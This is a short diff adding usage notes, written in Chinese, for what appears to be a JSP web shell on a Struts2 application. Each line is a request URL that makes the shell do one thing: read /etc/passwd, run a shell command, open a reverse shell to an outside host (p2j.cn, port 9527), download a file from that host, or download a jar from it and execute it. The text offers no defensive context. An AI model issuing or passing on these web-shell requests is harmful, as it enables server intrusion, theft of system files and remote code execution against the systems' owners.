@@ -1,0 +1,5 @@
+读文件：http://localhost:8080/Struts2/cat.jsp?action=cat&path=/etc/passwd
+执行命令：http://localhost:8080/Struts2/cat.jsp?action=exec&cmd=pwd
+弹shell:http://localhost:8080/Struts2/cat.jsp?action=shell&host=p2j.cn&port=9527
+下载文件:http://localhost:8080/Struts2/cat.jsp?action=download&url=http://p2j.cn/xx.txt&path=/tmp/xx.txt
+自动下载并执行:http://localhost:8080/Struts2/cat.jsp?action=auto&url=http://p2j.cn/xx.jar&path=/tmp/xx.jar&cmd=java%20-jar%20/tmp/xx.jar
